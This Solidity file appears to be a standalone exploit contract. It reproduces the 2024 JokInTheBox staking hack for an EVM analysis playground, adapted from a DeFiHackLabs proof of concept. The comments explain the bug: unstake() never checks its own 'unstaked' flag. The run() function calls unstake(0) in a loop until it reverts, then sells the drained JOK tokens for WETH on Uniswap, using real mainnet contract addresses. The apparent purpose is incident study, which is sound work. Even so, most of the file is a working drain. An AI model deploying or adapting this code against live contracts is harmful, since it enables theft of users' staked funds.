// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-JokInTheBox).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this): testExploit() buys JOK, stakes it,
// vm.warps 3 days, then replay-unstakes in a loop and sells), so there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack's SECOND HALF (replay-unstake +
// sell + repay) so the playground can deploy it and record run(). The FIRST
// HALF (buy JOK, stake) runs unrecorded via the config's `setup.steps`
// instead of inside this contract -- see the config comment for why: the
// exploit needs `unstake()`'s lock-period check (`currentDay > stakedDay +
// lockPeriod`) to already be satisfied, which requires stakedDay to be in the
// past relative to the recorded call's timestamp, but a single recorded call
// runs at ONE fixed block/timestamp. Splitting stake() into `setup` lets a
// `storeSlot` step backdate the stake's `stakedDay` field directly afterward,
// mirroring the test's `vm.warp(block.timestamp + 3 days)`. Logic and
// constants are copied verbatim from test/JokInTheBox_exp.sol.
//
// Root cause: JokInTheBoxStaking.unstake(stakeIndex) sets a per-stake
// `unstaked = true` flag but NEVER checks it before paying out, and always
// transfers the stake's original (memory-copied) `amountStaked`. So a single
// stake can be unstaked repeatedly -- each call re-pays the same principal --
// until the *global* `totalStaked` accumulator underflows on the checked
// subtraction `totalStaked -= currentStake.amountStaked` and reverts.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IJokInTheBoxStaking {
    function unstake(uint256 stakeIndex) external;
}

contract JokInTheBoxDrain {
    IJokInTheBoxStaking constant jokStake_ = IJokInTheBoxStaking(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d);
    IERC20 constant jok_ = IERC20(0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97);
    IERC20 constant weth_ = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniRouterV2 constant router_ = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    // Mirrors the back half of testExploit(): replay-unstake the single stake
    // created in setup (whose lock-period check is already satisfied via the
    // backdated stakedDay), sell the accumulated JOK for WETH, and repay the
    // 0.2 ETH "flash loan" (which never actually left this contract -- the
    // setup phase already spent and repaid the ETH float the same way the
    // original test's address(this) would have).
    function run() external {
        while (true) {
            try jokStake_.unstake(0) {} catch {
                break;
            }
        }

        address[] memory path = new address[](2);
        path[0] = address(jok_); // token
        path[1] = address(weth_); // weth

        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            jok_.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        weth_.transfer(address(0xdead), 0.2 ether); // repay flashloan
    }

    // Receives the setup-phase ETH float (0.2 ETH) before run() spends it via
    // the router.
    receive() external payable {}
}
